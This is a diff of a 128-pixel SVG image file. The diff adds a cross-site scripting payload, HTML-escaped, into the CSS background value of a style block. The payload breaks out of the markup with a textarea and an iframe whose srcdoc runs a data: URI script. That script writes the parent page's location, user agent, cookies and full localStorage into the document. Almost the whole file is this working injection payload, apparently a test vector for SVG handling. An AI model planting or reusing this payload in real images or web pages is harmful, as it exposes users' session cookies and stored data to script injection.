@@ -1,7 +1,8 @@
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" height="128px" version="1.1" width="128px">
-        <style type="text/css">
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="128px" height="128px" version="1.1">
+  <style type="text/css">
             s {
-                background : "";
+                background : "&lt;textarea&gt;&lt;/textarea&gt;&lt;iframe/srcdoc=&amp;lt;script/src=data:,try{parent.document.write(&amp;#x27;\x3cb\x3eLocation:\x3c/b\x3e&amp;#x27;+parent.location+&amp;#x27;\x3cbr\x3e\x3cb\x3eUserAgent:\x3c/b\x3e&amp;#x27;+navigator.userAgent+&amp;#x27;\x3cbr\x3e\x3cb\x3eCookie:\x3c/b\x3e&amp;#x27;+document.cookie+&amp;#x27;\x3cbr\x3e\x3cb\x3eLocalStorage:\x3c/b\x3e&amp;#x27;+JSON.stringify(localStorage)+&amp;#x27;\x3cbr\x3e&amp;#x27;)}catch(e){parent.document.write(e.message)}&amp;gt;&amp;lt;/script&amp;gt;321&gt;&lt;/iframe&gt;";
             }
         </style>
 </svg>
